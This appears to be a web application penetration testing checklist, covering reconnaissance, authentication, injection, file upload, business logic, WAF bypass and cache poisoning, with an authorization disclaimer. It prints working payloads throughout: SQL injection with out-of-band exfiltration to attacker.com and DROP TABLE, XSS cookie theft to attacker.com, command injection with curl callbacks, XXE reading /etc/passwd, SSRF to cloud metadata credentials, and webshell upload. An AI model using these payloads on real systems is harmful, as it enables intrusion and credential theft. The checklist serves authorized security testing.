# Web Application Security Testing

Full testing flow for web applications - process, checklist, steps, tools and things to check per phase. Payload strings for every vulnerability are in [payload-reference.md](payload-reference.md); the full tool inventory is in [tools-reference.md](tools-reference.md); methodology/SDLC/CVSS/reporting context is in [sdlc-security-testing.md](sdlc-security-testing.md). API-specific depth (GraphQL/gRPC/JWT/OAuth) is in [api-security-testing.md](api-security-testing.md).

Every vulnerability from the master list is covered here or in the file above; the complete-coverage map is in the "Additional Vulnerability Checks" section near the end. Use only against targets you own or are explicitly authorized to test.

---

# WEB APPLICATION PENTESTING

---

## 1. Reconnaissance & Enumeration

### 1.1 Passive Recon

#### Network & DNS
- `whois <domain>` - registrar, org, contacts
- `dig <domain> ANY` - A, MX, TXT, CNAME, PTR records
- `dig axfr @<nameserver> <domain>` - DNS zone transfer (AXFR)
- Check if ICMP is allowed (ping sweep)

#### Subdomain Enumeration
```bash
subfinder -d <domain>
amass enum --passive -d <domain>
assetfinder <domain>
theHarvester -d <domain> -b all
```

#### Certificate Transparency
- Search `crt.sh` for `%.<domain>`
- Tools: `certspotter`, `ctsearch`

#### HTTP Headers & Security Config
- `shcheck <url>` - security header analysis
- Mozilla HTTP Observatory - header grading
- Check presence of: `CSP`, `HSTS`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, `CORS`

#### SSL/TLS Analysis
```bash
testssl.sh <domain>
sslscan <domain>
sslyze <domain>
```
- Check: SSLv3, TLS < 1.2, weak ciphers (RC4), HSTS presence, OCSP stapling, cert expiry, chain validity

#### Email Security
- `spoofcheck <domain>` - SPF, DKIM, DMARC policies
- Verify DMARC `p=reject` or `p=quarantine` enforcement

#### Technology Fingerprinting
- Identify web server, CMS, frameworks, hosting type (PaaS, serverless)
- Detect WAF, reverse proxy, IPS
- Tools: `Wappalyzer`, `BuiltWith`, `WhatWeb`, `Retire.js` (outdated JS libs)

#### OSINT
- Google Dorks: `site:<domain> filetype:pdf`, `intitle:"index of"`, `"<domain>" ext:env OR ext:config`
- GHDB (Google Hacking Database)
- `waybackurls <domain>` - archived URLs
- Shodan, Censys, ZoomEye - exposed services
- `gitrob`, `truffleHog`, `gitleaks` - public repo secret scanning
- Check LinkedIn, job postings, social profiles for tech stack clues
- Tools: `Recon-ng`, `Maltego`

#### File & Source Code Review
- Review client-side JS for: hardcoded secrets, API keys, tokens, private IPs, endpoints
- Check for exposed: `robots.txt`, `sitemap.xml`, `.htaccess`, `/.git/`, `/.env`, `<META>` tags
- Probe backup/config extensions: `.old`, `.bak`, `.inc`, `.src`, `.swp`, `~`

#### Security Misconfigurations (Passive)
- Open directories, default credentials, exposed stack traces
- Bad CORS from debug mode, insecure headers, open admin panels

---

### 1.2 Active Recon

#### Host & Port Discovery
```bash
nmap -sn <cidr>                        # ping sweep
rustscan -a <target>                   # fast port scan
masscan -p1-65535 <target>
nmap -sV -sC -p <ports> <target>       # service/version/scripts
```

#### DNS Probing
```bash
amass enum -active -d <domain>
dnsrecon -d <domain> -t axfr,brt
dnsenum <domain>
fierce -dns <domain>
```

#### Content Discovery
```bash
# Crawling / URL Extraction
waybackurls <domain> | tee urls.txt
gau <domain>
hakrawler -url <url> -depth 3
gospider -s <url> -o output

# Directory / File Brute-force
ffuf -u https://<target>/FUZZ -w <wordlist>
dirsearch -u <url> -e php,html,js,txt,bak
gobuster dir -u <url> -w <wordlist>

# Endpoint & Parameter Extraction
linkfinder -i <url> -o cli
getJS -url <url>
SecretFinder -i <url>
AdminPBuster
arjun -u <url>          # hidden parameters
paramspider -d <domain>
kxss                    # XSS parameter fuzzing
```

#### Manual Browsing Targets
- `/admin`, `/administrator`, `/backoffice`, `/backend`, `/manager/html`
- `/login`, `/wp-admin`, `/phpmyadmin`, `/console`, `/.git`, `/.env`
- Alt ports: `8080` (Tomcat), `8443`, `8888`, `9090`
- Detect CMS/portal -> map endpoints/API -> attempt access/enumeration

---

## 2. Authentication Testing

### 2.1 Registration
- Register with duplicate email variations: uppercase, `+1@`, dots, URL encoding
- Attempt account overwrite (existing user takeover via re-registration)
- Test weak password policy: `user=password`, `123456`, `qwerty12`, spaces-only, `>200 chars` (DoS)
- Register without verifying -> request password change -> check if account activates
- Re-register with same/different password using same request
- JSON array injection: `{"email":"victim@mail.com","hacker@mail.com","token":"xxx"}`
- Null byte in email: `my%00email@mail.com` (account takeover)
- XSS in name or email fields
- Race condition on account creation endpoint
- Check OAuth (social login) for `state` parameter presence and CSRF validation
- Test redirect after registration/login for open redirect
- Rate limit on account creation
- Fuzz after user creation - check if folders/files are created with profile name
- Register with corporate domain email and check confirmation requirement
- Capture integration URL - attempt integration takeover via leaked OAuth/SSO endpoints

### 2.2 Login & Credential Testing
- Username enumeration via different error messages (valid vs. invalid username)
- Brute-force: default creds (`admin/admin`, `test/test`), credential stuffing, password spraying
- `cewl <url> -m 6 -d 3 > wordlist.txt` - generate site-specific wordlist
- Test login over HTTP (if available alongside HTTPS)
- Account lockout after N failed attempts
- "Remember me" token - test predictability and expiry
- Auto-complete on login form (`autocomplete="off"` bypass)
- Lack of re-auth on sensitive actions (email/password/2FA change)
- SAML authentication - response tampering
- OAuth login - test for open redirect
- After logout -> clear cache -> visit `/login?next=accounts/profile` -> open redirect
- Try `/login?next=javascript:alert(1);//` for XSS via redirect
- Browser cache weakness: check `Pragma`, `Expires`, `Cache-Control: max-age`
- Impersonation function - test if admin impersonation can be abused
- Fail-open conditions - test if auth errors ever allow access (anonymous fallback)
- SQL injection in login fields: `' OR '1'='1`, `admin'--`

### 2.3 Forgot Password / Reset
- Token uniqueness and entropy
- Reset link expiry - use after expiration
- Request 2 reset links -> use the older one
- Check for sequential tokens across multiple requests
- `Host: evil.com` / `X-Forwarded-Host: evil.com` - redirect reset link to attacker
- IDOR in reset link - tamper user ID or email field
- Email crafting: `victim@gmail.com@target.com`
- Carbon copy injection: `email=victim@mail.com%0a%0dcc:hacker@mail.com`
- Append second email param in body
- No TLD in email param: `user@localhost`
- Token leakage in `Referer` header
- Use `username@burp_collab.net` - monitor for DNS/HTTP callbacks
- No rate limit -> OTP/link flooding (1000+ requests)
- Long password (`>200 chars`) -> DoS on reset
- Response manipulation to bypass reset validation
- Understand token generation logic (timestamp, username, birthdate)

### 2.4 OTP Testing
- OTP is random and not sequential
- OTP reuse after successful login
- Expired OTP acceptance
- Brute-force 6-digit OTP (000000-999999) via Burp Intruder
- Rate limit bypass on OTP endpoint
- OTP replay attack (capture and resend request)
- OTP not exposed in response, logs, or client-side code
- Multiple simultaneous OTP requests (race condition) - check if old OTPs are invalidated
- Response manipulation to bypass OTP check (`false` -> `true`, `0` -> `1`)

### 2.5 Multi-Factor Authentication (MFA)
- Bypass attemps: missing MFA after password change, cookie manipulation
- Rate limiting on OTP endpoints
- CSRF on MFA verfication
- Backup codes exposure or reuse
- Session handling after MFA success

### 2.6 JWT Testing
- Signature validation
```bash
# Decode & inspect
jwt.io / jwt_tool

# Test alg: none (remove signature)
# Change HS256 -> RS256 with public key as secret
# Weak secret brute-force
hashcat -a 0 -m 16500 <token> <wordlist>
```
- Check `exp` claim - use expired token
- Token reuse after logout
- Bad refresh logic - reuse old refresh token
- JWT tampering - modify `sub`, `role`, `user_id` claims
- Kid injection

### 2.7 CAPTCHA Bypass
- Send old/expired CAPTCHA value
- Send old CAPTCHA with old session ID
- Request CAPTCHA absolute path: `www.url.com/captcha/1.png`
- Remove CAPTCHA parameter from request
- Change POST -> GET
- Convert JSON request to standard form
- OCR-based solver on simple CAPTCHAs
- Header injections: `X-Forwarded-For`, `X-Real-IP`

### 2.8 Session Management
- Decode cookies (Base64, hex, URL) - check for sensitive data
- Cookie flags: `HttpOnly`, `Secure`, `SameSite`
- Cookie expiration time
- Session fixation - inject known session ID before login
- Reuse session cookie after logout (check invalidation)
- Logout -> browser back (Alt+Left arrow) - check if session still active
- 2 browser instances: change password in one, refresh the other
- Use same cookie from different IP/device
- Concurrent logins from multiple devices
- Session binding to IP or User-Agent
- Replay privileged cookie with unprivileged session
- CSRF on state-changing requests (missing/bypassable anti-CSRF token)
- Path traversal in cookie scope
- Tokens disclosed in logs, debug consoles, or error messages
- Weak security questions - guessable or small pool

---

## 3. Authorization & Access Control

### 3.1 Forced Browsing
- Directly access: `/admin`, `/superuser`, `/config`, `/backup`, `/debug`, `/logs`
- Access unlinked/hidden endpoints not visible in navigation

### 3.2 IDOR / Broken Object Level Authorization
- Modify `user_id`, `order_id`, `invoice_id`, `file_id` in URL, body, headers
- Brute-force sequential/predictable IDs: `userId=1`, `userId=2`
- Horizontal privilege escalation: access another user's data
- Check IDs exposed in JS files, error messages, or API responses
- IDOR in: orders, invoices, tickets, cart, shipment, PDF/print generation, profile picture URL
- Check unsubscribe endpoint for user enumeration via ID

### 3.3 Privilege Escalation (Vertical)
- Identify critical roles (admin, manager)
- Modify `role=user` -> `role=admin` in params, cookies, or body
- Use role matrix testing: attempt access to endpoints and data with lower-privilege roles
- Access restricted paths as lower-privileged user
- Compare API responses between roles for data leakage
- Missing role checks on endpoints
- Frontend-only enforcement - bypass JS-only controls via Burp

### 3.4 BAC Bypass Techniques
- **HTTP Verb Tampering:** GET -> POST -> PUT/PATCH/DELETE/OPTIONS
- **Header Manipulation:** `X-Original-URL: /admin`, `X-Forwarded-For: 127.0.0.1`, `X-HTTP-Method-Override: DELETE`
- **User-Agent / Referer Spoofing** - bypass header-based access restrictions
- **Workflow Skipping** - access final step (e.g., payment confirmation) without prerequisites
- **Parameter Tampering** - modify hidden fields, role flags, access-control params
- **CSP Whitelisted Domain Bypass:** identify whitelisted domain in CSP -> change Host header -> resend

---

## 4. Input Validation & Injection

### 4.1 SQL Injection

#### Detection
1. Submit `'` -> look for SQL syntax errors
2. Boolean conditions: `AND 1=1` vs `AND 1=2` - different responses indicate injection
3. Time-delay: `SLEEP(5)` or `WAITFOR DELAY '0:0:5'`
4. OAST payloads (DNS/HTTP) for OOB injection
5. Second-order: store payload via registration/profile, trigger via another query

#### Entry Points
- URL parameters, POST data, HTTP headers (`User-Agent`, `Referer`, `Cookie`, `X-Forwarded-For`), JSON/XML fields, `ORDER BY` clause

#### Error-Based Payloads
```sql
' AND extractvalue(1,concat(0x7e,database()))-- -        -- MySQL DB name
' AND updatexml(1,concat(0x7e,version()),1)-- -          -- MySQL version
' AND 1=convert(int,@@version)-- -                       -- MSSQL
' AND 1=cast(version() as int)-- -                       -- PostgreSQL
' AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))-- -  -- Oracle
```

#### Union-Based Payloads
```sql
' ORDER BY 1-- - ... ' ORDER BY N-- -                    -- find column count
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,database()-- -
' UNION SELECT 1,2,table_name FROM information_schema.tables-- -
' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username, password FROM users-- -
' UNION SELECT username||'~'||password FROM users-- -    -- combine values
```

#### Boolean-Based Blind
```sql
' AND 1=1-- -                                            -- true (normal page)
' AND 1=2-- -                                            -- false (different response)
' AND (SELECT 'a' FROM users LIMIT 1)='a                 -- confirm table exists
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
```

#### Time-Based Blind
```sql
-- MySQL
' AND IF(1=1, SLEEP(5), 0)-- -
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -
'; IF (SELECT SUBSTRING(db_name(),1,1))='a' WAITFOR DELAY '0:0:5'-- -
-- PostgreSQL
' AND (SELECT pg_sleep(5))-- -
-- Oracle
' AND (SELECT dbms_pipe.receive_message('x',5) FROM dual) IS NULL-- -
```

#### Out-of-Band (OOB)
```sql
-- MySQL
' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\x'))-- -
-- MSSQL
'; DECLARE @h varchar(8000); SET @h='\\attacker.com\share\'+db_name()+'.txt'; EXEC master..xp_dirtree @h-- -
-- Oracle
' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))=1-- -
```

#### Stacked Queries
```sql
'; DROP TABLE users-- -
'; EXEC xp_cmdshell 'dir'-- -                            -- MSSQL RCE
'; INSERT INTO users VALUES('hacker','pass')-- -
'; SELECT * FROM users INTO OUTFILE '/tmp/out.txt'-- -   -- MySQL file write
```

#### WAF Bypass (SQLi)
```sql
' aNd 1=1-- -                  -- case variation
'/**/AND/**/1=1-- -            -- comment splitting
'/*!50000AND*/ 1=1-- -         -- MySQL version comments
se/**/lect                     -- split keywords
uNiOn SeLeCt                   -- mixed case
%27%20AND%201%3D1--%20-        -- URL encoding
%2527%2520AND%25201%253D1      -- double URL encoding
0x2720414e4420313d31           -- hex encoding
' AND 'a'='a'                  -- concatenation
```

#### SQLMap Commands
```bash
sqlmap -u "http://target.com/page?id=1" --batch
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns
sqlmap -u "http://target.com/page?id=1" -D dbname -T users -C user,pass --dump
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --dump
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --os-shell
sqlmap -r request.txt --batch --dbs
```

---

### 4.2 Cross-Site Scripting (XSS)

#### Reflected XSS
- Submit alphanumeric probe -> identify reflection context -> craft payload
- Test all entry points: search, forms, headers, URL params
- Burp Intruder with allowed HTML tags/events wordlist

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
javascript:alert(1)
`${alert(1)}`
<svg><animatetransform onbegin=alert(1)></svg>
\"-alert(1)}//
%22%3E%3Cimg%20src=x%20onerror=prompt(1);%3E
<link rel="canonical" href="https://test.com/?" accesskey="x" onclick="alert(1)">
<svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click</text></a></svg>
<!-- AngularJS -->
[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
```

#### DOM-Based XSS
- Inject into: `location`, `document.URL`, `document.location`, `document.referrer`
- Manipulate query/hash params: `#?name=<img src=x onerror=alert(1)>`
- Inspect JS for sinks: `innerHTML`, `document.write`, `eval`, `URLSearchParams`

```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<!-- AngularJS sandbox escape -->
{{constructor.constructor('alert(1)')()}}
```

#### Stored XSS
- Inject into: comments, user bio/name, posts, file names, addresses, profile picture filename

```html
<script>alert('stored')</script>
<img src=x onerror=alert('stored')>
<svg/onload=alert('stored')>
<a href="#" onclick="alert('stored')">Click</a>
http://foo?&apos;-alert(1)-&apos;
```

#### Filter Bypass
```html
<ScRiPt>alert(1)</sCrIpT>
<script>ale\u0072t(1)</script>
<img src=1 onerror=&#97;&#108;&#101;&#114;&#116;(1)>
jaVaScRiPt:alert(1)
```

#### Exfiltration Payloads
```html
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

---

### 4.3 OS Command Injection

#### Separators
- **Cross-platform:** `&`, `&&`, `|`, `||`
- **Unix only:** `;`, `\n` (0x0A), `` `cmd` ``, `$(cmd)`

#### Test Payloads
```bash
; whoami
| id
& ping -c 5 attacker.com
; curl http://attacker.com/$(whoami)
; cat /etc/passwd
$(sleep 5)
`sleep 5`
; nslookup attacker.com
```
- Test via: Referer header, User-Agent header, file upload (image processing), filename fields

---

### 4.4 XXE (XML External Entity)
- Change `Content-Type` to `text/xml` or `application/xml`
- Test in: file uploads, XML APIs, SOAP endpoints

```xml
<!-- Read local file -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

<!-- SSRF via XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service/">]>

<!-- OOB XXE: DNS exfiltration -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=">]>

<!-- Blind XXE via external DTD -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

<!-- XInclude -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

### 4.5 SSRF (Server-Side Request Forgery)
- Test in: image fetchers, webhooks, PDF generators, URL preview, import-by-URL, `Referer` header

```
http://127.0.0.1
http://localhost
http://169.254.169.254/latest/meta-data/       # AWS metadata
http://169.254.170.2/v2/credentials/           # ECS credentials
http://metadata.google.internal/               # GCP metadata
http://127.0.0.1:8080/admin
http://internal-host:3306
dict://127.0.0.1:11211/stats                   # Memcached
file:///etc/passwd
gopher://127.0.0.1:6379/_*1%0d%0a...           # Redis
```
- Bypass filters: `http://127.1`, `http://0x7f000001`, `http://2130706433`, `http://[::1]`

---

### 4.6 SSTI (Server-Side Template Injection)
```
{{7*7}} -> 49  (Jinja2/Twig)
${7*7} -> 49  (Freemarker)
<%= 7*7 %> -> 49  (ERB)
{{7*'7'}} -> 7777777  (Jinja2)
#{7*7} -> 49  (Ruby)
*{7*7} -> 49  (Spring)
{{config}} -> dump Flask config
{{''.__class__.__mro__[1].__subclasses__()}} -> enumerate Python classes
${class.getResource('/').getPath()} -> Freemarker path disclosure
```
- Tool: `tplmap`

---

### 4.7 Other Injections

#### NoSQL Injection
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}}
```
```
username[$ne]=invalid&password[$ne]=invalid
username[$gt]=&password[$gt]=
```

#### LDAP Injection
```
*)(uid=*))(|(uid=*
admin)(&)
*()|%26'
```

#### XPath Injection
```
' or '1'='1
' or ''='
x' or name()='username' or 'x'='y
```

#### SMTP Header Injection
```
victim@mail.com%0aCC:hacker@mail.com
victim@mail.com%0aBcc:attacker@example.com
victim@mail.com%0a%0dcc:hacker@mail.com
```

#### HTTP Header Injection
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: attacker.com
X-Original-URL: /admin
X-HTTP-Method-Override: DELETE
```

#### HTML Injection
```html
<h1>Injected</h1>
<iframe src="http://attacker.com"></iframe>
```

#### SSI Injection (Server-Side Includes)
```
<!--#exec cmd="whoami" -->
<!--#include file="../../etc/passwd" -->
<!--#printenv -->
```

#### SOAP Injection
- Inject XML/SOAP payloads into SOAP endpoints (via XXE or SQLi in SOAP parameters)

---

### 4.8 Open Redirect
- Test params: `?next=`, `?url=`, `?redirect=`, `?return=`, `?to=`, `?dest=`

```
/login?next=https://attacker.com
/login?next=//attacker.com
/login?next=javascript:alert(1)
/login?next=%2F%2Fattacker.com
/login?next=\attacker.com
```

---

### 4.9 HTTP Request Smuggling
- Test `Content-Length` and `Transfer-Encoding` desync (CL.TE, TE.CL, TE.TE)
- Tools: `smuggler.py`, Burp HTTP Request Smuggler extension

---

### 4.10 Path Traversal / LFI / RFI
```
../../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252F..%252Fetc/passwd                    # double-encoded
..\\..\\etc\\passwd
/etc/passwd%00.jpg                          # null byte
php://filter/convert.base64-encode/resource=index.php
expect://id
http://attacker.com/shell.txt               # RFI
```

---

### 4.11 Insecure Deserialization
- Identify serialized objects in: cookies, hidden fields, API payloads
- Formats: Java (`aced0005`), PHP (`O:`, `a:`), Python pickle, YAML, JSON with type hints
- Tools: `ysoserial` (Java), `phpggc` (PHP), `Burp Deserialization Scanner`
- Check `__wakeup`, `__destruct`, `readObject` gadget chains

---

## 5. File Upload Testing

### 5.1 File Type Bypass
- Upload `.php`, `.php5`, `.phtml`, `.pHp` (case variation)
- Double extension: `shell.php.jpg`, `malware.png.php`
- Change `Content-Type: image/png` while uploading PHP shell
- Polyglot file (valid image + embedded script)
- Magic bytes: prepend `GIF89a` to PHP payload
- Null byte: `shell.php%00.jpg`

### 5.2 Metadata & Content Injection
- Filename: `<script>alert(1)</script>.jpg` -> stored XSS
- Inject into EXIF metadata: JS, SQL, HTML payloads
- SQL injection payload in filename
- Path traversal in filename: `../../evil.php`

### 5.3 Resource Handling
- Oversized file (beyond limit) - DoS
- 0-byte file
- 20000x20000 pixel image - image processing crash
- Concurrent large file uploads - server stability
- Slow upload (Slowloris) - server timeout handling
- Rate limiting on upload endpoint

### 5.4 Access Control & Storage
- Direct access: `/uploads/shell.php`
- IDOR: access another user's file by changing ID/path
- Check file overwrite by attacker
- Verify `Content-Disposition: attachment` (prevent inline execution)
- Check `X-Content-Type-Options: nosniff`
- Open S3/GCS buckets, public ACLs, exposed SAS tokens
- CDN caching of sensitive uploaded content

### 5.5 Execution & Malware
- Upload `shell.php.jpg` -> request via direct URL -> check RCE
- Upload EICAR test file -> check AV/malware scanning
- Webshell upload and execution
- Imagetragick exploit (ImageMagick processing)

### 5.6 Logic Checks
- Bypass file upload restrictions via alternate API/mobile endpoints
- Server-side (not just client-side) validation
- Multiple upload attempts - check if old links are invalidated

---

## 6. Business Logic Testing

### 6.1 Application Logic
- Tamper `product_id`, `price`, `quantity` in add/modify/pay/delete actions
- Tamper or reuse gift/discount/coupon codes
- Parameter pollution to use coupon twice: `coupon=CODE&coupon=CODE`
- Check CVV and card number masking in payment forms
- Test credit card: `4111 1111 1111 1111`
- IDOR in: tickets, cart, shipment, PDF/print generation
- Check unsubscribe button for user enumeration
- Parameter pollution on social media sharing links
- Change POST -> GET for sensitive requests
- Reuse token, skip steps, act as another user, change action order

### 6.2 Business Logic Flaws
- Cart manipulation, order tampering, coupon stacking
- Payment flow bypass - skip payment, jump to confirmation
- Refund manipulation via out-of-order workflow steps
- Race condition: simultaneously redeem multiple coupon/gift codes, double transactions, multiple withdrawals
- Unlimited redemption of single-use resources
- Role transitions and assumption flaws

### 6.3 Rate Limiting Tests
- No rate limit on login -> brute-force
- No rate limit on password reset -> OTP/link flooding
- Bypass via: `X-Forwarded-For: <different_IP>`, `X-Real-IP` header spoofing
- Bypass via IP rotation, multiple accounts, session resets
- Burst/parallel requests to exploit race conditions
- Parameter manipulation: `/?id=1` vs `/?id=1&x=abc` - different rate limit buckets
- Test alternative endpoints: `/api/v1/login` vs `/api/v2/login` vs mobile API

---

## 7. Profile & Account Management
- Tamper `user_id` param -> access other users' details
- Change email to existing email - check server-side validation
- New email confirmation link flow (what if user doesn't confirm?)
- Profile picture URL - check for embedded user info or EXIF geolocation data
- Check metadata of downloadable files (geolocation, usernames)
- Account deletion -> reactivate via Forgot Password
- Brute-force/enumerate when changing unique user parameters
- Re-authentication requirement for sensitive operations
- Parameter pollution: add two values for same field
- CSRF on: email update, password change, 2FA enrollment, account deletion
- CSV import: command injection, XSS, macro injection payloads
- Check different roles policy enforcement

---

## 8. Client-Side Testing
- `localStorage`, `sessionStorage`, `indexedDB`, cookies - check for sensitive data
- CORS: test `Origin: attacker.com` -> check `Access-Control-Allow-Origin: *` or reflection
- CSP: check for `unsafe-inline`, `unsafe-eval`, wildcard sources, missing SRI
- Third-party scripts without `integrity` attribute (SRI)
- DOM-based vulns: inspect `innerHTML`, `document.write`, `eval` sinks
- Source map exposure: check for `.map` files in production (`app.js.map`)
- Debug endpoints: `/debug`, `/test`, `/__webpack_hmr`, `/actuator`
- Broken link hijacking: `blc <url>` - find broken outbound links
- Client-side logic manipulation: bypass JS-only validation via Burp
- Sensitive data in URL query strings

---

## 9. Infrastructure & Error Handling

### 9.1 Error Handling
- Access fake pages: `/whatever_fake.php`, `/fake.aspx`
- Inject `{}`, `[]`, `[` in cookie and parameter values to trigger errors
- Append `/~randomthing/%s` to URLs
- Burp Intruder "Fuzzing Full" list against inputs
- Invalid HTTP verbs: `PATCH`, `DEBUG`, `FAKE`, `FOO`
- Input data exceeding size limit
- Check for exposed stack traces, server banners, framework errors

### 9.2 Infrastructure
- Dangerous HTTP methods: `OPTIONS`, `PUT`, `DELETE`, `TRACE`
- `xmlrpc.php` - DoS and user enumeration
- Virtual hosting misconfiguration: `VHostScan`
- Internal numeric IPs in requests (SSRF exposure)
- Cloud storage: open S3 buckets, public GCS, exposed SAS tokens
- Alternate channels: `www.site.com` vs `m.site.com` vs API subdomain
- Shared/ASP-hosted infrastructure segregation
- Check for internal IP addresses reflected in responses

---

## 10. WAF Bypass Techniques

### Encoding
| Technique | Example |
|-----------|---------|
| URL encoding | `<script>` -> `%3Cscript%3E` |
| Double URL encoding | `'` -> `%2527` |
| Base64 (API params) | `admin' OR '1'='1` -> base64 encoded |
| HTML entities | `<script>` -> `&lt;script&gt;` |
| Unicode tricks | `\u003cscript\u003e` |
| Overlong UTF-8 | `/%2565tc/passwd` |

### Bypass Techniques
- **HTTP Parameter Pollution:** `?id=1&id=2` - WAF reads first, backend uses second
- **Alternate HTTP Methods:** PUT, DELETE, PATCH, OPTIONS may skip WAF rules
- **Host Header Manipulation:** `X-Forwarded-Host: alternate-domain.com`
- **Request Smuggling / Desync:** exploit CL vs TE parsing differences
- **Fragmentation:** split payloads across TCP packets (`<scri` + `pt>`)
- **Path Traversal Variants:** `..%2F`, `..%252F`, `..\\`
- **Whitespace alternatives:** `%09` (tab), `%0a` (newline), `%0d%0a` (CRLF)
- **Case manipulation:** `uNiOn SeLeCt`
- **Comment splitting:** `se/**/lect`, `UN/**/ION`

---

## 11. Web Cache Poisoning

### Attack Vectors
- **Host Header Injection:** `X-Forwarded-Host: attacker.com` - reflected in cached response
- **Unkeyed parameters:** inject `?evil=<payload>` - ignored by cache key, reflected in response
- **Vary header abuse:** app varies on `User-Agent` but cache ignores it -> inject via UA
- **HTTP Method Confusion:** GET with malicious headers cached as normal response
- **Encoding tricks:** `/%2e%2e/admin` - cache treats as static, backend resolves to admin
- **Cookie bombing:** inject cookies that affect response but are ignored by cache key
- **Cache-Control abuse:** force `public, max-age=600` on sensitive responses
- **Open redirect poisoning:** cache attacker-controlled redirect responses
- **Query Parameter Pollution:** inject extra params server reacts to, cache ignores

### Test Steps
1. Identify cache keys (remove params one-by-one, check `X-Cache: HIT`)
2. Find unkeyed inputs (headers/params not in cache key but reflected in response)
3. Inject payload into unkeyed input -> request twice -> verify second response is cached
4. Confirm poisoning serves payload to other users (Burp Collaborator)

---

## 12. Quick Reference: Tools

| Category | Tools |
|----------|-------|
| Recon | `subfinder`, `amass`, `assetfinder`, `theHarvester`, `whois`, `dig` |
| SSL/TLS | `testssl.sh`, `sslscan`, `sslyze` |
| Crawling | `waybackurls`, `gau`, `hakrawler`, `gospider` |
| Dir/File Enum | `ffuf`, `dirsearch`, `gobuster`, `dirb` |
| Param Discovery | `arjun`, `paramspider`, `kxss` |
| JS Analysis | `linkfinder`, `getJS`, `SecretFinder`, `Retire.js` |
| SQLi | `sqlmap`, `Burp Intruder`, `jSQL Injection` |
| XSS | `Burp`, `kxss`, `dalfox` |
| JWT | `jwt.io`, `jwt_tool`, `hashcat` |
| SSTI | `tplmap` |
| Deserialization | `ysoserial`, `phpggc` |
| Smuggling | `smuggler.py`, Burp HTTP Request Smuggler |
| Proxy / Intercept | `Burp Suite`, `OWASP ZAP`, `mitmproxy` |
| OSINT | `Shodan`, `Censys`, `Maltego`, `Recon-ng` |
| Secrets Scan | `truffleHog`, `gitleaks`, `gitrob`, `git-secrets` |
| Cloud | `awscli` (S3 enum), `gcpcli` |
| WAF Detection | `wafw00f` |
| Wordlists | `SecLists`, `cewl` |

(Full inventory with URLs and usage in [tools-reference.md](tools-reference.md).)

---

## 13. Additional Vulnerability Checks (complete coverage)

These complete the mapping of the master vulnerability list to this file. Payloads for each are in [payload-reference.md](payload-reference.md).

### 13.1 CRLF Injection / HTTP Response Splitting
- Inject `%0d%0a` into any value reflected into a header (`Location`, `Set-Cookie`) or the response.
- Confirm you can add a header line (e.g. set a cookie, split a second response) -> response splitting, cache poisoning, reflected XSS via injected headers, session fixation.
- **Check:** redirect params, any user value echoed into a response header.

### 13.2 LDAP / XPath / Expression Language / XML Injection
- **LDAP** (LDAP-backed login/search): `*)(uid=*))(|(uid=*`, `*`, `admin)(&)` for auth bypass/enumeration.
- **XPath** (XML credential store): `' or '1'='1`, blind extraction via `substring()`/`string-length()`.
- **Expression Language / OGNL** (Spring SpEL, Struts): probe `${7*7}`/`#{7*7}`/`%{7*7}` -> `49`; escalate to RCE (Struts CVE-2017-5638 class).
- **XML injection** (structure tampering in XML/SOAP): inject tags to alter/add elements; chains into XXE.

### 13.3 Prototype Pollution
- Send `{"__proto__":{"isAdmin":true}}` to merge endpoints, or `?__proto__[isAdmin]=true` to vulnerable query parsers.
- Check a fresh object inherits the polluted property. Impact: auth-flag flip, DoS, client-side XSS, Node RCE via gadget.
- **Check:** JSON merge/extend utilities, query-string parsers, client-side libraries using unsafe deep-merge.

### 13.4 Clickjacking (UI redressing)
- Try to load the target in an `<iframe>`; if it renders and a sensitive one-click action exists, it is framable.
- **Check:** `X-Frame-Options` / CSP `frame-ancestors` present on sensitive pages. PoC: transparent iframe (`opacity:0`) over a decoy button.

### 13.5 CORS Misconfiguration
- Send `Origin: https://evil.com`; if reflected in `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`, cross-origin read of authenticated data is possible. Test `null` origin and weak allow-list regex. (Also covered under section 8 Client-Side.)

### 13.6 Subdomain Takeover
- Enumerate subdomains (subfinder/amass/crt.sh), resolve, find CNAMEs pointing to deprovisioned services (GitHub Pages/Heroku/S3/Azure) returning a "not found" fingerprint -> register the dangling resource.
- **Check:** dangling DNS records; claim/verify external resources before DNS points at them.

### 13.7 DNS Rebinding
